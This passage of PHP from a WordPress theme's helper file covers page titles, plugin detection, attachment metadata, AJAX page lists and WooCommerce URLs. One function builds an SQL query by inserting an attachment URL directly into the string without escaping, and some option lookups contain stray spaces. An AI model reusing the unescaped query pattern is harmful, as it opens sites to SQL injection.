			//get parent theme
			$current_theme = $current_theme->parent();
		}

		if($current_theme->exists() && $current_theme->get('Version') != "") {
			$classes[] = $theme_prefix.'-theme-ver-'.$current_theme->get('Version');
			$classes[] = $theme_prefix.'-theme-'. strtolower($current_theme->get('Name'));
		}

		return $classes;
	}

	add_filter('body_class','bridge_qode_theme_version_class');
}

if(!function_exists('bridge_qode_get_title_text')) {
	/**
	 * Function that returns current page title text. Defines qode_title_text filter
	 * @return string current page title text
	 *
	 * @see is_tag()
	 * @see is_date()
	 * @see is_author()
	 * @see is_category()
	 * @see is_home()
	 * @see is_search()
	 * @see is_404()
	 * @see get_queried_object_id()
	 * @see bridge_qode_is_woocommerce_installed()
	 *
	 * @since 4.3
	 * @version 0.1
	 *
	 */
	function bridge_qode_get_title_text() {
		global $bridge_qode_options;

		$id 	= get_queried_object_id();
		$title 	= '';

		//is current page tag archive?
		if (is_tag()) {
			//get title of current tag
			$title = single_term_title("", false)." Tag";
		}

		//is current page date archive?
		elseif (is_date()) {
			//get current date archive format
			$title = get_the_time('F Y');
		}

		//is current page author archive?
		elseif (is_author()) {
			//get current author name
			$title = esc_html__('Author:', 'bridge') . " " . get_the_author();
		}

		//us current page category archive
		elseif (is_category()) {
			//get current page category title
			$title = single_cat_title('', false);
		}

		//is current page blog post page and front page? Latest posts option is set in Settings -> Reading
		elseif (is_home() && is_front_page()) {
			//get site name from options
			$title = get_option('blogname');
		}

		//is current page search page?
		elseif (is_search()) {
			//get title for search page
			$title = esc_html__('Search', 'bridge');
		}

		//is current page 404?
		elseif (is_404()) {
			//is 404 title text set in theme options?
			if($bridge_qode_options['404_title'] != "") {
				//get it from options
				$title = $bridge_qode_options['404_title'];
			} else {
				//get default 404 page title
				$title = esc_html__('404 - Page not found', 'bridge');
			}
		}

		//is WooCommerce installed and is shop or single product page?
		elseif(bridge_qode_is_woocommerce_installed() && (bridge_qode_is_woocommerce_shop() || is_singular('product'))) {
			//get shop page id from options table
			$shop_id = get_option('woocommerce_shop_page_id');

			//get shop page and get it's title if set
			$shop = get_post($shop_id);
			if(isset($shop->post_title) && $shop->post_title !== '') {
				$title = $shop->post_title;
			}

		}

		//is WooCommerce installed and is current page product archive page?
		elseif(bridge_qode_is_woocommerce_installed() && (is_product_category() || is_product_tag())) {
			global $wp_query;

			//get current taxonomy and it's name and assign to title
			$tax 			= $wp_query->get_queried_object();
			$category_title = $tax->name;
			$title 			= $category_title;
		}

		//is current page some archive page?
		elseif (is_archive()) {
			$title = esc_html__('Archive','bridge');
		}

		//current page is regular page
		else {
			$title = get_the_title($id);
		}

		$title = apply_filters('bridge_qode_filter_title_text', $title);

		return $title;
	}
}

if(!function_exists('bridge_qode_title_text')) {
	/**
	 * Function that echoes title text.
	 *
	 * @see bridge_qode_get_title_text()
	 *
	 * @since 4.3
	 * @version 0.1
	 */
	function bridge_qode_title_text() {
		echo bridge_qode_get_title_text();
	}
}

if(!function_exists('bridge_qode_wp_title')) {
	/**
	 * Function that sets page's title. Hooks to pre_get_document_title filter
	 * which is hook for theme predefined title
	 * @return string changed title text if SEO plugins aren't installed
	 *
	 * @since 5.0
	 * @version 0.3
	 */
	function bridge_qode_wp_title() {
		global $bridge_qode_options;

        if(bridge_qode_seo_plugin_installed()) {
            //don't do anything, seo plugin will take care of it
        } else {
            //get current post id
            $id = bridge_qode_get_page_id();

            $sep = ' | ';
            $title_prefix = get_bloginfo('name');
            $title_suffix = '';

            //set unchanged title variable so we can use it later
            $unchanged_title = get_the_title( $id );

            //is qode seo enabled?
            if(isset($bridge_qode_options['disable_qode_seo']) && $bridge_qode_options['disable_qode_seo'] !== 'yes') {
                //get current post seo title
                $seo_title = get_post_meta($id, "qode_seo_title", true);

                //is current post seo title set?
                if($seo_title !== '') {
                    $title_suffix = $seo_title;
                }
            }

            //title suffix is empty, which means that it wasn't set by qode seo
            if(empty($title_suffix)) {
                //if current page is front page append site description, else take original title string
                $title_suffix = is_front_page() ? get_bloginfo('description') : $unchanged_title;
            }

            //concatenate title string
            $title  = $title_prefix.$sep.$title_suffix;

            //return generated title string
            return $title;
        }
	}

	add_filter('pre_get_document_title', 'bridge_qode_wp_title');
}

if(!function_exists('bridge_qode_user_scalable_meta')) {
	/**
	 * Function that outputs user scalable meta if responsiveness is turned on
	 * Hooked to bridge_qode_header_meta action
	 */
	function bridge_qode_user_scalable_meta() {
		global $bridge_qode_options;

		//is responsiveness option is chosen?
		if (isset($bridge_qode_options['responsiveness']) && $bridge_qode_options['responsiveness'] !== 'no') { ?>
			<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
		<?php }	else { ?>
			<meta name="viewport" content="width=1200,user-scalable=no">
		<?php }
	}

	add_action('bridge_qode_action_header_meta', 'bridge_qode_user_scalable_meta');
}

if(!function_exists('bridge_qode_get_attachment_meta')) {
	/**
	 * Function that returns attachment meta data from attachment id
	 * @param $attachment_id
	 * @param array $keys sub array of attachment meta
	 * @return array|mixed
	 */
	function bridge_qode_get_attachment_meta($attachment_id, $keys = array()) {
		$meta_data = array();

		//is attachment id set?
		if(!empty($attachment_id)) {
			//get all post meta for given attachment id
			$meta_data = get_post_meta($attachment_id, '_wp_attachment_metadata', true);

			//is subarray of meta array keys set?
			if(is_array($keys) && count($keys) && is_array($meta_data) && count($meta_data)) {
				$sub_array = array();

				//for each defined key
				foreach($keys as $key) {
					//check if that key exists in all meta array
					if(array_key_exists($key, $meta_data)) {
						//assign key from meta array for current key to meta subarray
						$sub_array[$key] = $meta_data[$key];
					}
				}

				//we want meta array to be subarray because that is what used wants to get
				$meta_data = $sub_array;
			}
		}

		//return meta array
		return $meta_data;
	}
}

if(!function_exists('bridge_qode_get_attachment_id_from_url')) {
	/**
	 * Function that retrieves attachment id for passed attachment url
	 * @param $attachment_url
	 * @return null|string
	 */
	function bridge_qode_get_attachment_id_from_url($attachment_url) {
		global $wpdb;
		$attachment_id = '';

		//is attachment url set?
		if($attachment_url !== '') {
			//prepare query
			$query = "SELECT ID FROM {$wpdb->posts} WHERE guid='$attachment_url'";

			//get attachment id
			$attachment_id = $wpdb->get_var($query);
		}

		//return it
		return $attachment_id;
	}
}

if(!function_exists('bridge_qode_get_attachment_meta_from_url')) {
	/**
	 * Function that returns meta array for give attachment url
	 * @param $attachment_url
	 * @param array $keys sub array of attachment meta
	 * @return array|mixed
	 *
	 * @see bridge_qode_get_attachment_id_from_url()
	 * @see bridge_qode_get_attachment_meta()
	 *
	 * @version 0.1
	 */
	function bridge_qode_get_attachment_meta_from_url($attachment_url, $keys = array()) {
		$attachment_meta = array();

		//get attachment id for attachment url
		$attachment_id 	= bridge_qode_get_attachment_id_from_url($attachment_url);

		//is attachment id set?
		if(!empty($attachment_id)) {
			//get post meta
			$attachment_meta = bridge_qode_get_attachment_meta($attachment_id, $keys);
		}

		//return post meta
		return $attachment_meta;
	}
}

if(!function_exists('bridge_qode_get_image_dimensions')) {
	/**
	 * Function that returns image sizes array. First looks in post_meta table if attachment exists in the database,
	 * if it doesn't than it uses getimagesize PHP function to get image sizes
	 * @param $url string url of the image
	 * @return array array of image sizes that containes height and width
	 *
	 * @see bridge_qode_get_attachment_meta_from_url()
	 * @uses getimagesize
	 *
	 * @version 0.1
	 */
	function bridge_qode_get_image_dimensions($url) {
		$image_sizes = array();

		//is url passed?
		if($url !== '') {
			//get image sizes from posts meta if attachment exists
			$image_sizes = bridge_qode_get_attachment_meta_from_url($url, array('width', 'height'));

			//image does not exists in post table, we have to use PHP way of getting image size
			if ( is_array( $image_sizes ) && ! count( $image_sizes ) ) {
				require_once( ABSPATH . 'wp-admin/includes/file.php' );

				//can we open file by url?
				if ( ini_get( 'allow_url_fopen' ) == 1 && file_exists( $url ) ) {
					list( $width, $height, $type, $attr ) = getimagesize( $url );
				} else {
					//we can't open file directly, have to locate it with relative path.
					$image_obj           = parse_url( $url );
					$image_relative_path = rtrim( get_home_path(), '/' ) . $image_obj['path'];

					if ( file_exists( $image_relative_path ) ) {
						list( $width, $height, $type, $attr ) = getimagesize( $image_relative_path );
					}
				}

				//did we get width and height from some of above methods?
				if ( isset( $width ) && isset( $height ) ) {
					//set them to our image sizes array
					$image_sizes = array(
						'width'  => $width,
						'height' => $height
					);
				}
			}
		}

		return $image_sizes;
	}
}

if(!function_exists('bridge_qode_set_logo_sizes')) {
	/**
	 * Function that sets logo image dimensions to global qode options array so it can be used in the theme
	 */
	function bridge_qode_set_logo_sizes() {
		global $bridge_qode_options;

		//get logo image size
		$logo_image_sizes = bridge_qode_get_image_dimensions($bridge_qode_options['logo_image']);
		$bridge_qode_options['logo_width'] = 280;
		$bridge_qode_options['logo_height'] = 130;

		//is image width and height set?
		if(isset($logo_image_sizes['width']) && isset($logo_image_sizes['height'])) {
			//set those variables in global array
			$bridge_qode_options['logo_width'] = $logo_image_sizes['width'];
			$bridge_qode_options['logo_height'] = $logo_image_sizes['height'];
		}
	}

	//not used at the moment, so there is no need for action
	//add_action('init', 'qode_set_logo_sizes', 0);
}

if(!function_exists('bridge_qode_hide_initial_sticky_body_class')) {
    /**
     * Function that adds hidden initial sticky class to body.
     * @param $classes array of body classes
     * @return hidden initial sticky body class
     */
    function bridge_qode_hide_initial_sticky_body_class($classes) {
        global $bridge_qode_options;

        if(isset($bridge_qode_options['header_bottom_appearance']) && ($bridge_qode_options['header_bottom_appearance'] == "stick" || $bridge_qode_options['header_bottom_appearance'] == "stick menu_bottom" || $bridge_qode_options['header_bottom_appearance'] == "stick_with_left_right_menu")){
			if(get_post_meta(bridge_qode_get_page_id(), "qode_page_hide_initial_sticky", true) !== ''){
				if(get_post_meta(bridge_qode_get_page_id(), "qode_page_hide_initial_sticky", true) == 'yes'){
					$classes[] = 'hide_inital_sticky';
				}
			}else if(isset($bridge_qode_options['hide_initial_sticky']) && $bridge_qode_options['hide_initial_sticky'] == 'yes') {
				$classes[] = 'hide_inital_sticky';
			}
        }

        return $classes;
    }

    add_filter('body_class', 'bridge_qode_hide_initial_sticky_body_class');
}

if(!function_exists('bridge_qode_seo_plugin_installed')) {
	/**
	 * Function that checks if popular seo plugins are installed
	 * @return bool
	 */
	function bridge_qode_seo_plugin_installed() {
		//is YOAST installed?
		if(defined('WPSEO_VERSION')) {
			return true;
		}

		return false;
	}
}



if(!function_exists('bridge_qode_contact_form_7_installed')) {
	/**
	 * Function that checks if contact form 7 installed
	 * @return bool
	 */
	function bridge_qode_contact_form_7_installed() {
		//is Contact Form 7 installed?
		if(defined('WPCF7_VERSION')) {
			return true;
		}

		return false;
	}
}

if(!function_exists('bridge_qode_revolution_slider_installed')) {
	/**
	 * Function that checks if revolution slider installed
	 * @return bool
	 */
	function bridge_qode_revolution_slider_installed() {
		//is Revolution Slider installed?
		if(class_exists('RevSliderFront')) {
			return true;
		}
		return false;
	}
}

if(!function_exists('bridge_qode_layer_slider_installed')) {
	/**
	 * Function that checks if layer slider installed
	 * @return bool
	 */
	function bridge_qode_layer_slider_installed() {
		//is Layer Slider installed?
		if(defined('LS_PLUGIN_VERSION')) {
			return true;
		}
		return false;
	}
}

if(!function_exists('bridge_qode_envato_wordpress_toolkit_installed')) {
	/**
	 * Function that checks if layer slider installed
	 * @return bool
	 */
	function bridge_qode_envato_wordpress_toolkit_installed() {
		//is Envato WordPress Toolkit plugin installed?
		if(defined('EWPT_PLUGIN_VER')) {
			return true;
		}
		return false;
	}
}

if(!function_exists('bridge_qode_getenberg_editor_installed')) {
    /**
     * Function that checks if gutenberg editor is installed
     * @return bool
     */
    function bridge_qode_getenberg_editor_installed() {
        if( class_exists( 'WP_Block_Type' ) ) {
            return true;
        }
        return false;
    }
}

if(!function_exists('bridge_qode_getenberg_plugin_installed')) {
    /**
     * Function that checks if gutenberg plugin is installed
     * @return bool
     */
    function bridge_qode_getenberg_plugin_installed() {
        if( function_exists( 'is_gutenberg_page' ) && is_gutenberg_page() ) {
            return true;
        }
        return false;
    }
}

if(!function_exists('bridge_qode_qode_listing_installed')) {
	/**
	 * Function that checks if qode listing installed
	 * @return bool
	 */
	function bridge_qode_qode_listing_installed() {
		//is Qode Listing installed?
		if(defined('QODE_LISTING_VERSION')) {
			return true;
		}
		return false;
	}
}
if(!function_exists('bridge_qode_qode_tours_installed')) {
	/**
	 * Function that checks if qode tours installed
	 * @return bool
	 */
	function bridge_qode_qode_tours_installed() {
		//is Qode Tours installed?
		if(defined('QODE_TOURS_VERSION')) {
			return true;
		}
		return false;
	}
}
if(!function_exists('bridge_qode_qode_music_installed')) {
    /**
     * Function that checks if qode music is installed
     * @return bool
     */
    function bridge_qode_qode_music_installed() {
        //is Qode Music installed?
        if(defined('QODE_MUSIC_VERSION')) {
            return true;
        }
        return false;
    }
}
if(!function_exists('bridge_qode_qode_lms_installed')) {
    /**
     * Function that checks if qode lms is installed
     * @return bool
     */
    function bridge_qode_qode_lms_installed() {
        //is Qode Music installed?
        if(defined('QODE_LMS_VERSION')) {
            return true;
        }
        return false;
    }
}
if(!function_exists('bridge_qode_qode_news_installed')) {
	/**
	 * Function that checks if qode music is installed
	 * @return bool
	 */
	function bridge_qode_qode_news_installed() {
		//is Qode News installed?
		if(defined('QODE_NEWS_VERSION')) {
			return true;
		}
		return false;
	}
}
if(!function_exists('bridge_qode_qode_restaurant_installed')) {
	/**
	 * Function that checks if qode restaurant is installed
	 * @return bool
	 */
	function bridge_qode_qode_restaurant_installed() {
		//is Qode News installed?
		if(defined('QODE_RESTAURANT_VERSION')) {
			return true;
		}
		return false;
	}
}
if(!function_exists('bridge_qode_qode_twitter_feed_installed')) {
	/**
	 * Function that checks if qode restaurant is installed
	 * @return bool
	 */
	function bridge_qode_qode_twitter_feed_installed() {
		//is Qode News installed?
		if(defined('QODE_TWITTER_FEED_VERSION')) {
			return true;
		}
		return false;
	}
}
if(!function_exists('bridge_qode_qode_instagram_widget_installed')) {
	/**
	 * Function that checks if qode restaurant is installed
	 * @return bool
	 */
	function bridge_qode_qode_instagram_widget_installed() {
		//is Qode News installed?
		if(defined('QODE_INSTAGRAM_WIDGET_VERSION')) {
			return true;
		}
		return false;
	}
}
if(!function_exists('bridge_qode_qode_core_installed')) {
	/**
	 * Function that checks if qode restaurant is installed
	 * @return bool
	 */
	function bridge_qode_qode_core_installed() {
		//is Qode News installed?
		if(defined('BRIDGE_CORE_VERSION')) {
			return true;
		}
		return false;
	}
}
if(!function_exists('bridge_qode_timetable_schedule_installed')) {
	/**
	 * Function that checks if timetable installed
	 * @return bool
	 */
	function bridge_qode_timetable_schedule_installed() {
		//checking for this dummy function because plugin doesn't have constant or class
		//that we can hook to. Poorly coded plugin
		return function_exists('timetable_load_textdomain');
	}
}

if(!function_exists('bridge_qode_post_has_read_more')) {
	/**
	 * Function that checks if current post has read more tag set
	 * @return int position of read more tag text. It will return false if read more tag isn't set
	 */
	function bridge_qode_post_has_read_more() {
		global $post;

		return strpos($post->post_content, '<!--more-->');
	}
}

if(!function_exists('bridge_qode_is_main_menu_set')) {
	/**
	 * Function that checks if any of main menu locations are set.
	 * Checks whether top-navigation location is set, or left-top-navigation and right-top-navigation is set
	 * @return bool
	 *
	 * @version 0.1
	 */
	function bridge_qode_is_main_menu_set() {
		$has_top_nav = has_nav_menu('top-navigation');
		$has_divided_nav = has_nav_menu('left-top-navigation') && has_nav_menu('right-top-navigation');

		return $has_top_nav || $has_divided_nav;
	}
}

if(!function_exists('bridge_qode_is_wpml_installed')) {
	/**
	 * Function that checks if WPML plugin is installed
	 * @return bool
	 *
	 * @version 0.1
	 */
	function bridge_qode_is_wpml_installed() {
		return defined('ICL_SITEPRESS_VERSION');
	}
}

if( ! function_exists('bridge_qode_is_elementor_installed') ){
    function bridge_qode_is_elementor_installed(){
        return defined('ELEMENTOR_VERSION');
    }
}

if(!function_exists('bridge_qode_is_css_folder_writable')) {
	/**
	 * Function that checks if css folder is writable
	 * @return bool
	 *
	 * @version 0.1
	 * @uses is_writable()
	 */
	function bridge_qode_is_css_folder_writable() {
		$css_dir = get_template_directory().'/css';

		return is_writable($css_dir);
	}
}

if(!function_exists('bridge_qode_is_js_folder_writable')) {
	/**
	 * Function that checks if js folder is writable
	 * @return bool
	 *
	 * @version 0.1
	 * @uses is_writable()
	 */
	function bridge_qode_is_js_folder_writable() {
		$js_dir = get_template_directory().'/js';

		return is_writable($js_dir);
	}
}

if(!function_exists('bridge_qode_assets_folders_writable')) {
	/**
	 * Function that if css and js folders are writable
	 * @return bool
	 *
	 * @version 0.1
	 * @see bridge_qode_is_css_folder_writable()
	 * @see bridge_qode_is_js_folder_writable()
	 */
	function bridge_qode_assets_folders_writable() {
		return bridge_qode_is_css_folder_writable() && bridge_qode_is_js_folder_writable();
	}
}

if(!function_exists('bridge_qode_writable_assets_folders_notice')) {
	/**
	 * Function that prints notice that css and js folders aren't writable. Hooks to admin_notices action
	 *
	 * @version 0.1
	 * @link http://codex.wordpress.org/Plugin_API/Action_Reference/admin_notices
	 */
	function bridge_qode_writable_assets_folders_notice() {
		global $pagenow;

		$is_theme_options_page = isset($_GET['page']) && strstr($_GET['page'], 'qode_theme_menu');

		if($pagenow === 'admin.php' && $is_theme_options_page) {
			if(!bridge_qode_assets_folders_writable()) { ?>
				<div class="error">
					<p><?php esc_html_e('Note that writing permissions aren\'t set for folders containing css and js files on your server.
					We recommend setting writing permissions in order to optimize your site performance.
					For further instructions, please refer to our ', 'bridge'); ?><a target="_blank" href="http://demo.qodeinteractive.com/bridge-new-help/#!/getting_started"><?php esc_html_e('documentation', 'bridge'); ?></a></p>
<!--					<p>--><?php //esc_html_e('It seams that css and js files in theme folder aren\'t writable.', 'bridge'); ?><!--</p>-->
				</div>
			<?php }
		}
	}
	if(!is_multisite()) {
		add_action('admin_notices', 'bridge_qode_writable_assets_folders_notice');
	}
}

if(!function_exists('bridge_qode_localize_no_ajax_pages')) {
	/**
	 * Function that outputs no_ajax_obj javascript variable that is used default_dynamic.php.
	 * It is used for no ajax pages functionality
	 *
	 * Function hooks to wp_enqueue_scripts and uses wp_localize_script
	 *
	 * @see http://codex.wordpress.org/Function_Reference/wp_localize_script
	 *
	 * @uses bridge_qode_get_objects_without_ajax()
	 * @uses bridge_qode_get_pages_without_ajax()
	 * @uses bridge_qode_get_wpml_pages_for_current_page()
	 * @uses bridge_qode_get_woocommerce_pages()
	 *
	 * @version 0.1
	 */
	function bridge_qode_localize_no_ajax_pages() {
		global $bridge_qode_options;

		//is ajax enabled?
		if(bridge_qode_is_ajax_enabled()) {
			$no_ajax_pages = array();

            //get objects that have ajax disabled and merge with main array
			$no_ajax_pages = array_merge($no_ajax_pages, bridge_qode_get_objects_without_ajax());

			//is wpml installed?
			if(bridge_qode_is_wpml_installed()) {
				//get translation pages for current page and merge with main array
				$no_ajax_pages = array_merge($no_ajax_pages, bridge_qode_get_wpml_pages_for_current_page());
			}

			//is woocommerce installed?
			if(bridge_qode_is_woocommerce_installed()) {
				//get all woocommerce pages and products and merge with main array
				$no_ajax_pages = array_merge($no_ajax_pages, bridge_qode_get_woocommerce_pages());
				$no_ajax_pages = array_merge($no_ajax_pages, bridge_qode_get_woocommerce_archive_pages());
			}

			//do we have some internal pages that won't to be without ajax?
			if (isset($bridge_qode_options['internal_no_ajax_links'])) {
				//get array of those pages
				$options_no_ajax_pages_array = explode(',', $bridge_qode_options['internal_no_ajax_links']);

				if(is_array($options_no_ajax_pages_array) && count($options_no_ajax_pages_array)) {
					$no_ajax_pages = array_merge($no_ajax_pages, $options_no_ajax_pages_array);
				}
			}

			//add logout url to main array
			$no_ajax_pages[] = wp_specialchars_decode (wp_logout_url());

			//finally localize script so we can use it in default_dynamic
			wp_localize_script( 'bridge-default-dynamic', 'no_ajax_obj', array(
				'no_ajax_pages' => $no_ajax_pages
			));
		}
	}

	add_action('wp_enqueue_scripts', 'bridge_qode_localize_no_ajax_pages');
}

if(!function_exists('bridge_qode_get_woocommerce_pages')) {
	/**
	 * Function that returns all url woocommerce pages
	 * @return array array of WooCommerce pages
	 *
	 * @version 0.1
	 */
	function bridge_qode_get_woocommerce_pages() {
		$woo_pages_array = array();

		if(bridge_qode_is_woocommerce_installed()) {
			if(get_option('woocommerce_shop_page_id') != ''){ $woo_pages_array[] = get_permalink(get_option('woocommerce_shop_page_id')); }
			if(get_option('woocommerce_cart_page_id') != ''){ $woo_pages_array[] = get_permalink(get_option('woocommerce_cart_page_id')); }
			if(get_option('woocommerce_checkout_page_id') != ''){ $woo_pages_array[] = get_permalink(get_option('woocommerce_checkout_page_id')); }
			if(get_option('woocommerce_pay_page_id') != ''){ $woo_pages_array[] = get_permalink(get_option(' woocommerce_pay_page_id ')); }
			if(get_option('woocommerce_thanks_page_id') != ''){ $woo_pages_array[] = get_permalink(get_option(' woocommerce_thanks_page_id ')); }
			if(get_option('woocommerce_myaccount_page_id') != ''){ $woo_pages_array[] = get_permalink(get_option(' woocommerce_myaccount_page_id ')); }
			if(get_option('woocommerce_edit_address_page_id') != ''){ $woo_pages_array[] = get_permalink(get_option(' woocommerce_edit_address_page_id ')); }
			if(get_option('woocommerce_view_order_page_id') != ''){ $woo_pages_array[] = get_permalink(get_option(' woocommerce_view_order_page_id ')); }
			if(get_option('woocommerce_terms_page_id') != ''){ $woo_pages_array[] = get_permalink(get_option(' woocommerce_terms_page_id ')); }

			$woo_products = get_posts(array('post_type' => 'product','post_status' => 'publish', 'posts_per_page' => '-1') );

			foreach($woo_products as $product) {
				$woo_pages_array[] = get_permalink($product->ID);
			}
		}

		return $woo_pages_array;
	}
}


if(!function_exists('bridge_qode_get_woocommerce_archive_pages')) {
	/**
	 * Function that returns all url woocommerce pages
	 * @return array array of WooCommerce pages
	 *
	 * @version 0.1
	 */
	function bridge_qode_get_woocommerce_archive_pages() {
		$woo_pages_array = array();

		if(bridge_qode_is_woocommerce_installed()) {
			$terms = get_terms( array(
				'taxonomy' => array('product_cat','product_tag'),
				'hide_empty' => false,
			) );

			foreach($terms as $term) {
				$woo_pages_array[] = get_term_link($term->term_id);
			}
		}

		return $woo_pages_array;
	}
}

if(!function_exists('bridge_qode_get_objects_without_ajax')) {
	/**
	 * Function that returns urls of objects that have ajax disabled.
	 * Works for posts, pages and portfolio pages.
	 * @return array array of urls of posts that have ajax disabled
	 *
	 * @version 0.2
	 */
	function bridge_qode_get_objects_without_ajax() {
		$posts_without_ajax = array();

		$posts_args =  array(
			'post_type'  => array('post', 'portfolio_page', 'page'),
			'post_status' => 'publish',
			'meta_key' => 'qode_show-animation',
			'meta_value' => 'no_animation'
		);

		$posts_query = new WP_Query($posts_args);

		if($posts_query->have_posts()) {
			while($posts_query->have_posts()) {
				$posts_query->the_post();
				$posts_without_ajax[] = get_permalink(get_the_ID());
			}
		}

		wp_reset_postdata();

		return $posts_without_ajax;
	}
}

if(!function_exists('bridge_qode_get_pages_without_ajax')) {
	/**
	 * Function that returns urls of pages that have ajax disabled
	 * @return array array of urls of pages that have ajax disabled
	 *
	 * @version 0.1
	 */
	function bridge_qode_get_pages_without_ajax() {
		$pages_without_ajax = array();

		$pages_args = array(
			'post_type'  => 'page',
			'post_status' => 'publish',
			'meta_key' => 'qode_show-animation',
			'meta_value' => 'no_animation'
		);

		$pages_query = new WP_Query($pages_args);

		if($pages_query->have_posts()) {
			while($pages_query->have_posts()) {
				$pages_query->the_post();
				$pages_without_ajax[] = get_permalink(get_the_ID());
			}
		}

		wp_reset_postdata();

		return $pages_without_ajax;
	}
}

if(!function_exists('bridge_qode_get_wpml_pages_for_current_page')) {
	/**
	 * Function that returns urls translated pages for current page.
	 * @return array array of url urls translated pages for current page.
	 *
	 * @version 0.1
	 */
	function bridge_qode_get_wpml_pages_for_current_page() {
		$wpml_pages_for_current_page = array();

		if(bridge_qode_is_wpml_installed()) {
			$language_pages = icl_get_languages('skip_missing=0');

			foreach($language_pages as $key => $language_page) {
				$wpml_pages_for_current_page[] = $language_page["url"];
			}
		}

		return $wpml_pages_for_current_page;
	}
}

if(!function_exists('bridge_qode_is_ajax_enabled')) {
	/**
	 * Function that checks if ajax is enabled.
	 * @return bool
	 *
	 * @version 0.1
	 */
	function bridge_qode_is_ajax_enabled() {
		global $bridge_qode_options;

		$has_ajax = false;

		if(isset($bridge_qode_options['page_transitions']) && $bridge_qode_options['page_transitions'] !== '0') {
			$has_ajax = true;
		}

		return $has_ajax;
	}
}

if(!function_exists('bridge_qode_is_ajax_header_animation_enabled')) {
    /**
     * Function that checks if header animation with ajax is enabled.
     * @return boolean
     *
     * @version 0.1
     */
    function bridge_qode_is_ajax_header_animation_enabled() {
        global $bridge_qode_options;

        $has_header_animation = false;

        if(isset($bridge_qode_options['page_transitions']) && $bridge_qode_options['page_transitions'] !== '0' && isset($bridge_qode_options['ajax_animate_header']) && $bridge_qode_options['ajax_animate_header'] == 'yes') {
            $has_header_animation = true;
        }

        return $has_header_animation;
    }
}

if(!function_exists('bridge_qode_get_page_id')) {
	/**
	 * Function that returns current page / post id.
	 * Checks if current page is woocommerce page and returns that id if it is.
	 * Checks if current page is any archive page (category, tag, date, author etc.) and returns -1 because that isn't
	 * page that is created in WP admin.
	 *
	 * @return int
	 *
	 * @version 0.1
	 *
	 * @see bridge_qode_is_woocommerce_installed()
	 * @see bridge_qode_is_woocommerce_shop()
	 */
	function bridge_qode_get_page_id() {
		if(bridge_qode_is_woocommerce_installed() && (bridge_qode_is_woocommerce_shop() || is_singular('product'))) {
			return bridge_qode_get_woo_shop_page_id();
		}

        if(is_archive() || is_search() || is_404() || (is_home() && is_front_page())) {
			return -1;
		}

		return get_queried_object_id();
	}
}

if ( ! function_exists('bridge_qode_get_unique_page_class') ) {
	/**
	 * Returns unique page class based on post type and page id
	 *
	 * $params int $id is page id
	 * $params bool $allowSingleProductOption
	 * @return string
	 */
	function bridge_qode_get_unique_page_class($id, $allowSingleProductOption = false ) {
		$page_class = '';
		
		if ( bridge_qode_is_woocommerce_installed() && $allowSingleProductOption ) {
			
			if ( is_product() ) {
				$id = get_the_ID();
			}
		}
		
		if ( is_single() ) {
			$page_class = '.postid-' . $id;
		} elseif ( is_home() ) {
			$page_class .= '.home';
		} elseif ( is_archive() || $id === bridge_qode_get_woo_shop_page_id() ) {
			$page_class .= '.archive';
		} elseif ( is_search() ) {
			$page_class .= '.search';
		} elseif ( is_404() ) {
			$page_class .= '.error404';
		} else {
			$page_class .= '.page-id-' . $id;
		}
		
		return $page_class;
	}
}

if ( ! function_exists('bridge_qode_get_multisite_blog_id') ) {
    /**
     * Check is multisite and return blog id
     *
     * @return int
     */
    function bridge_qode_get_multisite_blog_id() {
        if ( is_multisite() ) {
            return get_blog_details()->blog_id;
        }
    }
}

if(!function_exists('bridge_qode_rewrite_rules_on_theme_activation')) {
	/**
	 * Function that sets rewrite rules when our theme is activated
	 */
	function bridge_qode_rewrite_rules_on_theme_activation() {
		flush_rewrite_rules();
	}

	add_action( 'after_switch_theme', 'bridge_qode_rewrite_rules_on_theme_activation' );
}

if(!function_exists('bridge_qode_visual_composer_installed')) {
	/**
	 * Function that checks if visual composer installed
	 * @return bool
	 */
	function bridge_qode_visual_composer_installed() {
		//is Visual Composer installed?
		if(class_exists('WPBakeryVisualComposerAbstract')) {
			return true;
		}

		return false;
	}
}

if(!function_exists('bridge_qode_visual_composer_custom_shortcodce_css')){
	function bridge_qode_visual_composer_custom_shortcodce_css(){
		if(bridge_qode_visual_composer_installed()){
			if(is_page() || is_single() || is_singular('portfolio_page')){
				$shortcodes_custom_css = get_post_meta( bridge_qode_get_page_id(), '_wpb_shortcodes_custom_css', true );
				if ( ! empty( $shortcodes_custom_css ) ) {
					echo '<style type="text/css" data-type="vc_shortcodes-custom-css-'.bridge_qode_get_page_id().'">';
					echo bridge_qode_get_module_part( $shortcodes_custom_css );
					echo '</style>';
				}
				$post_custom_css = get_post_meta( bridge_qode_get_page_id(), '_wpb_post_custom_css', true );
				if ( ! empty( $post_custom_css ) ) {
					echo '<style type="text/css" data-type="vc_custom-css-'.bridge_qode_get_page_id().'">';
					echo bridge_qode_get_module_part( $post_custom_css );
					echo '</style>';
				}
			}
		}
	}
	add_action('bridge_qode_action_visual_composer_custom_shortcodce_css', 'bridge_qode_visual_composer_custom_shortcodce_css');
}

if (!function_exists('bridge_qode_vc_grid_elements_enabled')) {

	/**
	 * Function that checks if Visual Composer Grid Elements are enabled
	 *
	 * @return bool
	 */
	function bridge_qode_vc_grid_elements_enabled() {

		global $bridge_qode_options;
		$vc_grid_enabled = false;

		if (isset($bridge_qode_options['enable_grid_elements']) && $bridge_qode_options['enable_grid_elements'] == 'yes') {

			$vc_grid_enabled = true;

		}

		return $vc_grid_enabled;

	}

}

if(!function_exists('bridge_qode_visual_composer_grid_elements')) {

	/**
	 * Removes Visual Composer Grid Elements post type if VC Grid option disabled
	 * and enables Visual Composer Grid Elements post type
	 * if VC Grid option enabled
	 */
	function bridge_qode_visual_composer_grid_elements() {

		global $bridge_qode_options;

		if(!bridge_qode_vc_grid_elements_enabled()){

			remove_action( 'init', 'vc_grid_item_editor_create_post_type' );

		}
	}

	add_action('vc_after_init', 'bridge_qode_visual_composer_grid_elements', 12);
}

if(!function_exists('bridge_qode_grid_elements_ajax_disable')) {
	/**
	 * Function that disables ajax transitions if grid elements are enabled in theme options
	 */
	function bridge_qode_grid_elements_ajax_disable() {
		global $bridge_qode_options;

		if(bridge_qode_vc_grid_elements_enabled()) {
			$bridge_qode_options['page_transitions'] = '0';
		}
	}

	add_action('wp', 'bridge_qode_grid_elements_ajax_disable');
}


if(!function_exists('bridge_qode_get_vc_version')) {
    /**
     * Return Visual Composer version string
     *
     * @return bool|string
     */
    function bridge_qode_get_vc_version()
    {
        if (bridge_qode_visual_composer_installed()) {
            return WPB_VC_VERSION;
        }

        return false;
    }
}

